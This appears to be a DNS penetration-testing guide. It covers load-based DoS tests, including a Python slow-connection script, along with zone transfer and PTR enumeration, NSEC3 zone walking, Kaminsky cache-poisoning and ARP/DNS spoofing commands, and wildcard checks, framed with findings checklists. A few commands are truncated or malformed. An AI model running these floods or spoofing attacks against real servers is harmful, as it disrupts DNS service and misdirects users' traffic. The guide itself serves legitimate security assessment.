## DoS

##### 1.1 Setup

Install ```dnsperf``` :

```bash
sudo apt install dnsperf
```

Capture a baseline :

```bash
dig @<IP> <target.com> A
```

```bash
# from the server
top -bn1 | head -20
```

Start evidence capture :
`
```bash
tcpdump -i <iface> port 53 -w capture.pcap
```

Setup a traffic check, run this in a separate terminal during every load test to measure real impact on legitimate queries :

```bash
while true; do dig @<IP> <target.com> A | grep "Query time"; sleep 2; done
```

##### 1.2 DRDoS

Open resolver check :

```bash
nmap -sU -p53 --script dns-recursion <IP>
```

Or manual test :

```bash
dig @<IP> google.com A +short
```

Measure the amplification factor :

```bash
dig @<IP> isc.org ANY +bufsize=4096 +stats
```

Compare the size of the sent request (```MSG SIZE sndsz```) to the size of the response (```MSG SIZE rcvd```).

Active RRL test :

```bash
for i in $(seq 1 200); do dig @<IP> isc.org ANY +bufsize=4096 +short; done | tee rrl.log
```

Check ```rrl.log``` for truncated/dropped/SERVFAIL responses appearing after a threshold. If every response stays identical with no throttling, RRL is likely absent or misconfigured.

Create a file ```queries_any.txt``` :

```bash
cat > queries_any.txt << EOF
<target.com> ANY
<target.com> DNSKEY
<target.com> TXT
<target.com> NS
EOF
```

Load test :

```bash
dnsperf -s <IP> -d queries_any.txt -l 60 -Q 2000
```

**Findings checklist :**

Recursion open to external clients :
- Open = finding

Amplification factor :
- BAF>~10x=at-risk record type

RRL behavior :
- No throttling observed after burst = finding

##### 1.3 NXDOMAIN Flood / Random Subdomain Attack

Generate a random subdomain list :

```bash
for i in $(seq 1 5000); do echo "$(openssl rand -hex 6).<target> A" >> queries.txt; done
```

Check the expected behavior :

```bash
dig @<IP> $(openssl rand -hex 6).<target> A
```

`**Load test — ramp up gradually, watch the 1.1 traffic check at every step, stop if the abort criteria is hit:**`

```bash
dnsperf -s <IP> -d queries.txt -l 60 -Q 500
dnsperf -s <IP> -d queries.txt -l 60 -Q 2000
dnsperf -s <IP> -d queries.txt -l 60 -Q 5000
```

Informational check (negative caching config) :

```bash
dig @<IP> <target.com> SOA
```

**Findings checklist :**

Legitimate query latency during each load step :
- > 2x baseline = availability impact, stop ramping

CPU on resolver/authoritative during test :
- Sustained > 90%

NXDOMAIN response rate vs timeout/SERVFAIL:
- High timeout rate at lower QPS = low resilience

##### 1.4 Slow Drip DoS

Delegate a test subdomain to the controlled server. Then, on this controlled test server, drop all responses silently :

```bash
iptables -A INPUT -p udp --dport 53 -j DROP
iptables -A INPUT -p tcp --dport 53 -j DROP
```

From the resolver :

```bash
dig @<resolver> sub-test-phantom.<target> A +time=10 +tries=1
```

Slow TCP connections test :

```python
import socket, time, threading

def slow_conn(target_ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, 53))
    try:
        for chunk in [b"\x00", b"\x1e", b"\x00\x01"]:
            s.send(chunk)
            time.sleep(5)
    except Exception:
        pass

threads = [threading.Thread(target=slow_conn, args=("<IP>",)) for _ in range(200)]
for t in threads:
    t.start()
```

Serve-side monitoring (during the test) :

```bash
ss -s
netstat -an | grep :53 | wc -l
top
```

Post-test verification :

```bash
dig @<IP> target.com A +short
systemctl status named
journalctl -u named --since "10 min ago"
```

**Findings checklist:**

Outstanding queries and open connections during the test :
- Grows unbounded without recovery

Memory/FD usage :
- Climbs and doesn't release after the test ends

Recovery time after test stops :
- Long tail of degraded latency

Service crash or restart :
- Any occurrence

### 2 Enumeration

##### 2.1 Zone Transfer (AXFR / IXFR)

Find the DNS servers using the following command :

```bash
dig NS <target> +short
```

Then, attempt zone transfer against each nameserver found :

```bash
dig axfr @<ns1> <target> +short
```

Try ```IXFR``` too (incremental transfer) :

```bash
dig ixfr=0 @<ns1> <target>
```

You can also automate this process using the following script :

```bash
for ns in $(dig NS <target> +short); do dig axfr @$ns <target>; done
```

##### 2.2 Reverse DNS / PTR walking

Resolve the target's A/AAAA records first to get IPs :

```bash
dig A <target> +short
dig AAAA <target> +short
```

Then resolve the PTR records :

```bash
dig -x <IP> +short
```

If the hostname and the target name (or an expected alias) are different, flag as a PTR/forward mismatch.

**DNSRecon :** 

Install *dnsrecon* :

```bash
pip install dnsrecon
```

Or directly check the [GitHub page](https://github.com/darkoperator/dnsrecon).

Range walking :

```bash
dnsrecon -r 192.0.2.0/24
```

You can also do it manually using this command :

```bash
for ip in 192.0.2.{1..254}; do dig -x $ip +short; done
```

##### 2.3 NSEC / NSEC3 (DNSSEC)

NESC3 : [CVE-2023-50868](https://www.cve.org/CVERecord?id=CVE-2023-50868)

Affected Bind versions :
- 9.0.0 -> 9.16.46
- 9.18.0 -> 9.18.22
- 9.19.0 -> 9.19.20
- 9.9.3-S1 -> 9.16.46-S1
- 9.18.11-S1 -> 9.18.22-S1

You can use this [GitHub](https://github.com/anonion0/nsec3map#) project to exploit :

```shell
sudo apt-get install python3 python3-pip python3-dev gcc libssl3 libssl-dev
python3 -m pip install n3map[predict]
# Or if you don't care about NSEC3 zone size prediction :
python3 -m pip install n3map
```

Enumerate a particular zone (e.g. example.com) and store the retrieved NSEC/NSEC3 records in a file example.com.zone :

```shell
n3map -v -o example.com.zone example.com
```

If the nameserver doesn't accept NSEC queries, use ```--query-mode A``` (short ```-A```) instead :

```shell
n3map -v -A --output root.zone .
```

The following example shows the enumeration of a NSEC3 chain at example.com using a nameserver at 192.168.1.37. It also shows the NSEC3 zone size prediction and progress indicator (enabled using the `-p` switch).

```shell
$ n3map -3po example.com.zone 192.168.1.37 example.com
;; mapping example.com.: 79% [===========================================================================                   ] ;;
;; records = 797; queries = 802; hashes = 3840; predicted zone size = 1003; ............... q/s = 513; coverage =  95.677595% ;;

received SIGINT, terminating
```

### 3 Spoofing & cache poisoning

##### 3.1 Kaminsky attack

Get the repository :

```bash
git clone https://github.com/piergiorgioladisa/KaminskyAttack.git
cd KaminskyAttack
```

Install the dependencies :

```bash
sudo apt install libnet1-dev libcap-dev
```

Compile the script :

```bash
gcc -lcap spoofdns.c -o spoofdns
```

The execute the script using the following syntax :

```bash
sudo ./spoofdns <ATTACKER_IP> <VICTIME_DNS_IP>
```

##### 3.2 NS injection in glue records

List the delegated nameservers and compare them against the glue records returned by the parent zone : 

```bash
dig NS +short dig @<target.com> NS
```

Check consistency between the glue A/AAAA records returned in the `+additional` section and the actual resolution of each NS :

```bash
dig A +short
dig AAAA +short
```

Flag any NS pointing to an unregistered or expired domain.

##### 3.3 MITM + spoofing UDP

ARP spoof to position on-path between client and resolver : 

```bash
arpspoof -i -t 
```

Passive DNS spoof listener :

```bash
dnsspoof -i
```

Check the victim resolves the spoofed record instead of the legitimate one :

```bash
dig @<target.com> A +short
```

### 4 Bad configuration

##### 4.1 Dangerous wildcard DNS

Query a random subdomain and compare it to the wildcard response : 

```bash
dig $(openssl rand -hex 8).<target.com> A +short
dig *.<target.com> A +short 
```

If both return the same IP, a wildcard is active : 

```bash
for i in $(seq 1 5); do dig $(openssl rand -hex 8).<target.com> A +short; done 
```